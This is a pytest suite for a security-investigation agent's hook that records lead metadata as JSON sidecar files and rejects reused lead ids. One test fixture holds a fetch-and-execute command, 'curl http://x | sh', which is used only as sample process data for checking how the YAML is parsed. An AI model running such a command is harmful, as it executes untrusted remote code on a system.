"""Tests for defender/hooks/record_lead.py.

The hook writes the leads-table row `gather_raw/{lead_id}.lead.json` from
the gather dispatch block and claims the `lead_id` with an atomic
exclusive create — a reused id fails the create and the hook exits 2.
"""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest


HOOK_PATH = Path(__file__).resolve().parents[1] / "hooks" / "record_lead.py"


def _load():
    spec = importlib.util.spec_from_file_location("record_lead", HOOK_PATH)
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def hook():
    return _load()


def _hook_input(prompt: str) -> str:
    return json.dumps({"tool_name": "Task", "tool_input": {"prompt": prompt}})


def _gather_prompt(run_dir: Path, lead_id, goal: str, dims: list[str]) -> str:
    dims_yaml = "\n".join(f"  - {d}" for d in dims)
    return (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n"
        "```yaml\n"
        f"run_dir: {run_dir}\n"
        f"lead_id: {lead_id}\n"
        f"goal: {goal}\n"
        f"what_to_summarize:\n{dims_yaml}\n"
        "```\n"
    )


def _run(hook, monkeypatch, prompt: str) -> int:
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    return hook.main()


def test_writes_lead_id_keyed_sidecar(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-A"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = _gather_prompt(run_dir, "l-001", "Did the FIM fire trace to apt?", ["apt history", "checksum"])
    assert _run(hook, monkeypatch, prompt) == 0

    sidecar = run_dir / "gather_raw" / "l-001.lead.json"
    assert sidecar.is_file()
    assert json.loads(sidecar.read_text()) == {
        "goal": "Did the FIM fire trace to apt?",
        "what_to_summarize": ["apt history", "checksum"],
    }


def test_creates_gather_raw_dir_if_missing(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-C"  # no gather_raw subdir
    assert _run(hook, monkeypatch, _gather_prompt(run_dir, "l-002", "g", ["d"])) == 0
    assert (run_dir / "gather_raw" / "l-002.lead.json").is_file()


def test_distinct_ids_in_a_batch_both_claim(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-batch"
    (run_dir / "gather_raw").mkdir(parents=True)
    assert _run(hook, monkeypatch, _gather_prompt(run_dir, "l-001", "g1", ["d"])) == 0
    assert _run(hook, monkeypatch, _gather_prompt(run_dir, "l-002", "g2", ["d"])) == 0
    assert (run_dir / "gather_raw" / "l-001.lead.json").is_file()
    assert (run_dir / "gather_raw" / "l-002.lead.json").is_file()


def test_reused_id_blocks_with_exit_2_and_remediation(tmp_path, hook, monkeypatch, capsys):
    run_dir = tmp_path / "run-reuse"
    (run_dir / "gather_raw").mkdir(parents=True)
    assert _run(hook, monkeypatch, _gather_prompt(run_dir, "l-001", "first", ["d"])) == 0
    # Second dispatch echoing the same id must be rejected.
    rc = _run(hook, monkeypatch, _gather_prompt(run_dir, "l-001", "second", ["d"]))
    assert rc == 2
    err = capsys.readouterr().err
    assert "l-001" in err
    assert "append a new :L" in err
    # The first claim's content is preserved (no overwrite).
    assert json.loads((run_dir / "gather_raw" / "l-001.lead.json").read_text())["goal"] == "first"


def test_malformed_lead_id_silently_skips(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-bad-id"
    (run_dir / "gather_raw").mkdir(parents=True)
    # `0` is not an l-NNN id → benign skip, no sidecar, no block.
    assert _run(hook, monkeypatch, _gather_prompt(run_dir, "0", "g", ["d"])) == 0
    assert list((run_dir / "gather_raw").glob("*.lead.json")) == []


def test_missing_lead_id_silently_skips(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-no-id"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n"
        f"run_dir: {run_dir}\n"
        "goal: g\n"
        "what_to_summarize:\n  - d\n```\n"
    )
    assert _run(hook, monkeypatch, prompt) == 0
    assert list((run_dir / "gather_raw").glob("*.lead.json")) == []


def test_silent_noop_for_non_task_tool(tmp_path, hook, monkeypatch):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "echo hi"}})
    monkeypatch.setattr(sys, "stdin", _StringIn(payload))
    assert hook.main() == 0


def test_silent_noop_for_non_gather_task(tmp_path, hook, monkeypatch):
    payload = json.dumps({
        "tool_name": "Task",
        "tool_input": {"prompt": "Some other subagent prompt without the marker"},
    })
    monkeypatch.setattr(sys, "stdin", _StringIn(payload))
    assert hook.main() == 0


def test_malformed_dispatch_does_not_raise(tmp_path, hook, monkeypatch):
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n???\nbroken\n```\n"
    )
    assert _run(hook, monkeypatch, prompt) == 0


def test_goal_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
    """`goal: Compare fields: user and src` must not be parsed as a nested
    mapping or silently dropped."""
    run_dir = tmp_path / "run-colon-goal"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n"
        f"run_dir: {run_dir}\n"
        "lead_id: l-001\n"
        "goal: Compare fields: user and src across both leads\n"
        "what_to_summarize:\n"
        "  - timing pattern (burst vs scheduled)\n"
        "```\n"
    )
    assert _run(hook, monkeypatch, prompt) == 0
    payload = json.loads((run_dir / "gather_raw" / "l-001.lead.json").read_text())
    assert payload["goal"] == "Compare fields: user and src across both leads"
    assert payload["what_to_summarize"] == ["timing pattern (burst vs scheduled)"]


def test_dimension_bullet_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
    """`- process cmdline: /bin/sh` must stay a string, not a mapping."""
    run_dir = tmp_path / "run-colon-bullet"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n"
        f"run_dir: {run_dir}\n"
        "lead_id: l-007\n"
        "goal: characterize the spawned process tree\n"
        "what_to_summarize:\n"
        "  - process cmdline: /bin/sh -c 'curl http://x | sh'\n"
        "  - parent pid: 4242 vs 4243\n"
        "```\n"
    )
    assert _run(hook, monkeypatch, prompt) == 0
    payload = json.loads((run_dir / "gather_raw" / "l-007.lead.json").read_text())
    assert payload["what_to_summarize"] == [
        "process cmdline: /bin/sh -c 'curl http://x | sh'",
        "parent pid: 4242 vs 4243",
    ]


def test_missing_required_keys_silently_skips_write(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-D"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\nrun_dir: " + str(run_dir) + "\nlead_id: l-001\n```\n"
    )
    assert _run(hook, monkeypatch, prompt) == 0
    assert not (run_dir / "gather_raw" / "l-001.lead.json").exists()


class _StringIn:
    def __init__(self, s: str):
        self._s = s

    def read(self) -> str:
        return self._s
